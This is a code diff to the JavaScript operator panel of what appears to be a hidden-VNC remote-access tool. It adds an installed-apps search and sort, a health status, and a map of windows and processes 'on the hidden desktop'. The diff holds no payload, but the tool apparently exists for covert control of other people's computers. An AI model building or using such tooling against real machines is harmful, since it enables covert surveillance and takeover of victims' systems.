@@ -416,6 +416,14 @@ import { createKeyboardCapture } from "./keyboard-capture.js";
         launchStatusEl.classList.add("hidden");
         launchStatusEl.classList.remove("flex");
       }, 15000);
+    } else if (step === "healthy") {
+      launchStatusIcon.className = "fa-solid fa-heart-pulse text-emerald-400";
+      launchStatusLabel.textContent = `${browser}: ${detail}`;
+      launchStatusLabel.className = "text-emerald-300";
+      launchHideTimer = setTimeout(() => {
+        launchStatusEl.classList.add("hidden");
+        launchStatusEl.classList.remove("flex");
+      }, 10000);
     } else if (step === "launch") {
       launchStatusIcon.className = "fa-solid fa-circle-check text-emerald-400";
       launchStatusLabel.textContent = `${browser}: ${detail}`;
@@ -485,7 +493,11 @@ import { createKeyboardCapture } from "./keyboard-capture.js";
   const installedAppsGrid = document.getElementById("installedAppsGrid");
   const installedAppsCount = document.getElementById("installedAppsCount");
   const refreshInstalledApps = document.getElementById("refreshInstalledApps");
+  const installedAppsSearch = document.getElementById("installedAppsSearch");
+  const installedAppsSearchClear = document.getElementById("installedAppsSearchClear");
+  const installedAppsEmpty = document.getElementById("installedAppsEmpty");
   let installedAppsData = [];
+  let installedAppsQuery = "";
 
   let installedAppsLoading_pending = false;
 
@@ -496,7 +508,73 @@ import { createKeyboardCapture } from "./keyboard-capture.js";
     if (installedAppsList) installedAppsList.classList.add("hidden");
     if (installedAppsGrid) installedAppsGrid.innerHTML = "";
     if (installedAppsCount) installedAppsCount.textContent = "";
+    if (installedAppsEmpty) installedAppsEmpty.classList.add("hidden");
     sendCmd("hvnc_installed_apps", {});
+  }
+
+  function applyInstalledAppsFilter() {
+    if (!installedAppsGrid) return;
+    const q = installedAppsQuery;
+    let visible = 0;
+    const buttons = Array.from(installedAppsGrid.children);
+
+    if (q) {
+      const prefix = [];
+      const contains = [];
+      const hidden = [];
+      for (const btn of buttons) {
+        const key = btn.dataset.search || "";
+        const name = (btn.dataset.name || "");
+        if (name.startsWith(q) || key.startsWith(q)) {
+          prefix.push(btn);
+        } else if (key.indexOf(q) !== -1) {
+          contains.push(btn);
+        } else {
+          hidden.push(btn);
+        }
+      }
+      for (const btn of prefix) { installedAppsGrid.appendChild(btn); btn.style.display = ""; }
+      for (const btn of contains) { installedAppsGrid.appendChild(btn); btn.style.display = ""; }
+      for (const btn of hidden) { installedAppsGrid.appendChild(btn); btn.style.display = "none"; }
+      visible = prefix.length + contains.length;
+    } else {
+      for (const btn of buttons) {
+        btn.style.display = "";
+        visible++;
+      }
+    }
+
+    if (installedAppsEmpty) {
+      installedAppsEmpty.classList.toggle("hidden", !(q && visible === 0 && installedAppsData.length > 0));
+    }
+    if (installedAppsSearchClear) {
+      installedAppsSearchClear.classList.toggle("hidden", !q);
+    }
+  }
+
+  if (installedAppsSearch) {
+    installedAppsSearch.addEventListener("input", () => {
+      installedAppsQuery = installedAppsSearch.value.trim().toLowerCase();
+      applyInstalledAppsFilter();
+    });
+    installedAppsSearch.addEventListener("click", (e) => e.stopPropagation());
+    installedAppsSearch.addEventListener("keydown", (e) => {
+      if (e.key === "Escape") {
+        installedAppsSearch.value = "";
+        installedAppsQuery = "";
+        applyInstalledAppsFilter();
+      }
+      e.stopPropagation();
+    });
+  }
+  if (installedAppsSearchClear) {
+    installedAppsSearchClear.addEventListener("click", (e) => {
+      e.stopPropagation();
+      if (installedAppsSearch) installedAppsSearch.value = "";
+      installedAppsQuery = "";
+      applyInstalledAppsFilter();
+      if (installedAppsSearch) installedAppsSearch.focus();
+    });
   }
 
   if (refreshInstalledApps) {
@@ -529,8 +607,16 @@ import { createKeyboardCapture } from "./keyboard-capture.js";
       if (installedAppsCount) installedAppsCount.textContent = `(${installedAppsData.length})`;
       if (installedAppsData.length === 0) {
         installedAppsGrid.innerHTML = '<div class="text-xs text-slate-600 text-center py-3">No apps found</div>';
+      } else {
+        installedAppsData.sort((a, b) => (a.name || "").localeCompare(b.name || "", undefined, { sensitivity: "base" }));
+        installedAppsGrid.innerHTML = "";
+        for (const app of installedAppsData) {
+          appendAppButton(app);
+        }
       }
     }
+
+    applyInstalledAppsFilter();
   }
 
   function appendAppButton(app) {
@@ -538,6 +624,11 @@ import { createKeyboardCapture } from "./keyboard-capture.js";
     btn.type = "button";
     btn.className = "installed-app-btn";
     btn.title = app.exePath || app.name;
+    btn.dataset.search = ((app.name || "") + " " + (app.exePath || "")).toLowerCase();
+    btn.dataset.name = (app.name || "").toLowerCase();
+    if (installedAppsQuery && btn.dataset.search.indexOf(installedAppsQuery) === -1) {
+      btn.style.display = "none";
+    }
 
     if (app.icon && /^[A-Za-z0-9+/=]+$/.test(app.icon)) {
       const img = document.createElement("img");
@@ -967,6 +1058,10 @@ import { createKeyboardCapture } from "./keyboard-capture.js";
       }
       if (msg && msg.type === "hvnc_browser_launch_status") {
         handleBrowserLaunchStatus(msg);
+        return;
+      }
+      if (msg && msg.type === "hvnc_window_list_result") {
+        handleWindowListResult(msg);
         return;
       }
       if (msg && msg.type === "hvnc_error") {
@@ -1455,6 +1550,136 @@ import { createKeyboardCapture } from "./keyboard-capture.js";
     if (latencyEl) {
       latencyEl.textContent = `${Math.round(ms)}ms`;
     }
+  }
+
+  // ── Window Map ──────────────────────────────────────────────
+  const windowMapBtn = document.getElementById("windowMapBtn");
+  const windowMapModal = document.getElementById("windowMapModal");
+  const windowMapCloseBtn = document.getElementById("windowMapCloseBtn");
+  const windowMapRefreshBtn = document.getElementById("windowMapRefreshBtn");
+  const windowMapCanvas = document.getElementById("windowMapCanvas");
+  const windowMapList = document.getElementById("windowMapList");
+
+  const WINDOW_COLORS = [
+    "#8b5cf6", "#3b82f6", "#10b981", "#f59e0b", "#ef4444",
+    "#ec4899", "#06b6d4", "#84cc16", "#f97316", "#6366f1",
+  ];
+
+  function openWindowMap() {
+    if (!windowMapModal) return;
+    windowMapModal.style.display = "flex";
+    sendCmd("hvnc_window_list", {});
+    if (windowMapCanvas) windowMapCanvas.innerHTML = '<div class="flex items-center justify-center h-40 text-slate-500 text-sm"><i class="fa-solid fa-spinner fa-spin mr-2"></i>Loading…</div>';
+    if (windowMapList) windowMapList.innerHTML = "";
+  }
+
+  function closeWindowMap() {
+    if (windowMapModal) windowMapModal.style.display = "none";
+  }
+
+  if (windowMapBtn) windowMapBtn.addEventListener("click", openWindowMap);
+  if (windowMapCloseBtn) windowMapCloseBtn.addEventListener("click", closeWindowMap);
+  if (windowMapRefreshBtn) windowMapRefreshBtn.addEventListener("click", () => {
+    sendCmd("hvnc_window_list", {});
+    if (windowMapCanvas) windowMapCanvas.innerHTML = '<div class="flex items-center justify-center h-40 text-slate-500 text-sm"><i class="fa-solid fa-spinner fa-spin mr-2"></i>Refreshing…</div>';
+    if (windowMapList) windowMapList.innerHTML = "";
+  });
+  if (windowMapModal) windowMapModal.addEventListener("click", (e) => {
+    if (e.target === windowMapModal) closeWindowMap();
+  });
+
+  function handleWindowListResult(msg) {
+    const monitors = msg.monitors || [];
+    const windows = msg.windows || [];
+
+    if (!windowMapCanvas || !windowMapList) return;
+
+    if (monitors.length === 0 && windows.length === 0) {
+      windowMapCanvas.innerHTML = '<div class="flex items-center justify-center h-40 text-slate-500 text-sm">No windows or monitors found</div>';
+      windowMapList.innerHTML = '<div class="text-slate-500 text-xs text-center py-2">No visible windows on the hidden desktop</div>';
+      return;
+    }
+
+    let minX = Infinity, minY = Infinity, maxX = -Infinity, maxY = -Infinity;
+    for (const m of monitors) {
+      minX = Math.min(minX, m.x);
+      minY = Math.min(minY, m.y);
+      maxX = Math.max(maxX, m.x + m.width);
+      maxY = Math.max(maxY, m.y + m.height);
+    }
+    for (const w of windows) {
+      minX = Math.min(minX, w.x);
+      minY = Math.min(minY, w.y);
+      maxX = Math.max(maxX, w.x + w.width);
+      maxY = Math.max(maxY, w.y + w.height);
+    }
+    if (!isFinite(minX)) { minX = 0; minY = 0; maxX = 1920; maxY = 1080; }
+
+    const totalW = maxX - minX || 1;
+    const totalH = maxY - minY || 1;
+    const containerW = windowMapCanvas.clientWidth || 800;
+    const aspect = totalW / totalH;
+    const mapH = Math.min(400, Math.max(180, containerW / aspect));
+    const scale = Math.min(containerW / totalW, mapH / totalH) * 0.92;
+    const padX = (containerW - totalW * scale) / 2;
+    const padY = (mapH - totalH * scale) / 2;
+
+    function tx(x) { return padX + (x - minX) * scale; }
+    function ty(y) { return padY + (y - minY) * scale; }
+    function tw(w) { return w * scale; }
+
+    let html = "";
+    windowMapCanvas.style.height = mapH + "px";
+
+    for (let i = 0; i < monitors.length; i++) {
+      const m = monitors[i];
+      const x = tx(m.x), y = ty(m.y), w = tw(m.width), h = tw(m.height);
+      html += `<div class="absolute border-2 border-dashed border-slate-600 rounded" style="left:${x}px;top:${y}px;width:${w}px;height:${h}px;" title="Monitor ${m.index}: ${m.name} (${m.width}x${m.height})">
+        <span class="absolute top-1 left-1.5 text-[10px] font-mono text-slate-500">${m.primary ? "★ " : ""}${m.name || "Monitor " + m.index}</span>
+        <span class="absolute bottom-1 right-1.5 text-[10px] font-mono text-slate-600">${m.width}×${m.height}</span>
+      </div>`;
+    }
+
+    for (let i = 0; i < windows.length; i++) {
+      const w = windows[i];
+      const color = WINDOW_COLORS[i % WINDOW_COLORS.length];
+      const x = tx(w.x), y = ty(w.y), ww = Math.max(tw(w.width), 8), wh = Math.max(tw(w.height), 8);
+      const shortTitle = w.title.length > 30 ? w.title.slice(0, 28) + "…" : w.title;
+      html += `<div class="absolute rounded border overflow-hidden cursor-default" style="left:${x}px;top:${y}px;width:${ww}px;height:${wh}px;border-color:${color};background:${color}18;" title="${escHtml(w.title)}\n${w.processName} (PID ${w.pid})\nPosition: ${w.x},${w.y} Size: ${w.width}×${w.height}\nMonitor: ${w.monitor >= 0 ? w.monitor : "none"}">
+        ${wh > 20 && ww > 50 ? `<div class="px-1 py-0.5 text-[9px] font-mono text-slate-200 truncate" style="background:${color}50;">${escHtml(shortTitle)}</div>` : ""}
+      </div>`;
+    }
+
+    windowMapCanvas.innerHTML = html;
+
+    let listHtml = `<div class="grid gap-1">
+      <div class="grid grid-cols-[auto_1fr_auto_auto_auto] gap-x-3 px-2 py-1 text-[11px] uppercase tracking-wide text-slate-500 border-b border-slate-800">
+        <span></span><span>Title</span><span>Process</span><span>Position</span><span>Monitor</span>
+      </div>`;
+
+    for (let i = 0; i < windows.length; i++) {
+      const w = windows[i];
+      const color = WINDOW_COLORS[i % WINDOW_COLORS.length];
+      const monLabel = w.monitor >= 0 ? (monitors[w.monitor] ? (monitors[w.monitor].name || "#" + w.monitor) : "#" + w.monitor) : "—";
+      listHtml += `<div class="grid grid-cols-[auto_1fr_auto_auto_auto] gap-x-3 items-center px-2 py-1.5 rounded hover:bg-slate-800/50 text-xs text-slate-300">
+        <span class="w-2.5 h-2.5 rounded-sm" style="background:${color};"></span>
+        <span class="truncate font-medium" title="${escHtml(w.title)}">${escHtml(w.title)}</span>
+        <span class="font-mono text-slate-400">${escHtml(w.processName)} <span class="text-slate-600">(${w.pid})</span></span>
+        <span class="font-mono text-slate-500">${w.x},${w.y} ${w.width}×${w.height}</span>
+        <span class="font-mono ${w.monitor >= 0 ? "text-slate-300" : "text-rose-400"}">${monLabel}</span>
+      </div>`;
+    }
+    listHtml += "</div>";
+
+    if (windows.length === 0) {
+      listHtml = '<div class="text-slate-500 text-xs text-center py-2">No visible windows on the hidden desktop</div>';
+    }
+
+    windowMapList.innerHTML = listHtml;
+  }
+
+  function escHtml(s) {
+    return s.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;").replace(/"/g, "&quot;");
   }
 
   connectWs();
